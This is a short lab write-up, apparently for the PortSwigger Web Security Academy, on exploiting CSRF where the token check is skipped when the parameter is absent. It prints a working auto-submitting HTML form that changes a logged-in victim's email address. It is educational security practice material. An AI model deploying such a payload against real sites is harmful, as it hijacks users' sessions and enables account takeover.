# CSRF where token validation depends on token being present
* This lab's email change functionality is vulnerabe to CSRF. To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewr's email address.
	* You can log in your own account using the following crdentials `wiener:peter`

### 1. Send the _POST /my-account/change-email_ request to repeater
* Then, try to send the request with an invalid CSRF toekn.

![6](https://user-images.githubusercontent.com/53956303/153676036-a1d2d972-2ff0-47ba-8149-346e3ac990d3.png)
* It returns a 400 status code and an error message "Invalid CSRF token"

### 2. Try to send the request without the CSRF token parameter
* Remove the CSRF token parameter to send the request.

![7](https://user-images.githubusercontent.com/53956303/153676242-afe20876-ba1f-41ac-b675-af89e17e9658.png)
* It returns 302 status code and the email is successfully changed. It means that the server does not verify the CSRF token at all.

### 3. Make a malicious HTML to change viewer's emaill address.
* Using the provided Exploit server
```html
<form method=POST action=https://ac931fc31f1693ecc0a20f4400db00e5.web-security-academy.net/my-account/change-email>
    <input type="hidden" name="email" value="pwnedwiener@pwn.com">
</form>
<script>
        document.forms[0].submit();
</script>
```
![8](https://user-images.githubusercontent.com/53956303/153676742-6d7d143e-5b4f-4821-ac19-a84908f128d8.png)

* Click "Store" and "Deliver exploit to victim".
	* As a result, the lab is solved.

![9](https://user-images.githubusercontent.com/53956303/153676696-f4c74ba4-bd6f-4c9a-9d19-9ca52415334a.png)
